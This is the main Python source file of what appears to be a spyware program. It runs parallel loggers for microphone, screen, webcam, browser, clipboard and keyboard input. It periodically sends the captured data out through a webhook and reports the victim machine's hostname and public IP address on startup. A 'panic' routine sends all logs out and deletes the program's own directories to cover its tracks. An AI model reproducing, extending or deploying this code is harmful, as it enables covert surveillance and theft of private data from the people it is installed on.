import atexit
import os
import platform
import requests
import threading
import time

from config import SEND_LOGS_INTERVAL_SEC, LOG_DIRECTORY_PATH

from modules.browser import BrowserLogger
from modules.clipboard import ClipboardLogger
from modules.input import InputLogger
from modules.microphone import MicrophoneLogger
from modules.screen import ScreenLogger
from modules.webcam import WebcamLogger

from utils.file_utils import create_log_directories
from utils.logging_utils import log_error, send_logs
from utils.webhook_utils import send_message


def send_all_logs(loggers):
    while True:
        for logger in loggers:
            try:
                logger.send_logs()
            except FileNotFoundError:
                pass
            except Exception as e:
                log_error(f"Unexpected error in send_logs: {e}")
            time.sleep(1)
        send_logs()
        time.sleep(SEND_LOGS_INTERVAL_SEC)


def create_modules():
    return [
        MicrophoneLogger(),
        ScreenLogger(),
        WebcamLogger(),
        BrowserLogger(),
        ClipboardLogger(),
        InputLogger(),
    ]


def start_threads(loggers):
    threads = []
    for logger in loggers:
        thread = threading.Thread(target=logger.run)
        thread.start()
        threads.append(thread)
    return threads


def startup_message():
    ip = requests.get("https://checkip.amazonaws.com").text.strip()
    message = f"Started logging on `{platform.uname().system} {platform.uname().release} ({platform.uname().version})` from `{platform.uname().node}` at IP: `{ip}`"
    send_message(message)


def exit_message():
    send_message(
        f"Logging stopped from `{platform.uname().node}.` Logs are available at `{LOG_DIRECTORY_PATH}`"
    )


atexit.register(exit_message)


def panic():
    send_message(f"PANIC TRIGGERED FROM `{platform.uname().node}!`")
    send_all_logs(create_modules())
    os.rmdir(LOG_DIRECTORY_PATH)
    os.rmdir(os.path.dirname(os.path.realpath(__file__)))
    os._exit(0)


def main():
    try:
        startup_message()
        create_log_directories()
        modules = create_modules()
        threads = start_threads(modules)
        send_logs_thread = threading.Thread(target=send_all_logs, args=(modules,))
        send_logs_thread.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        for module in modules:
            module.running = False
        for thread in threads:
            thread.join()
        send_logs_thread.join()
    except Exception as e:
        log_error(e)
        return 1
    return 0


if __name__ == "__main__":
    exit(main())
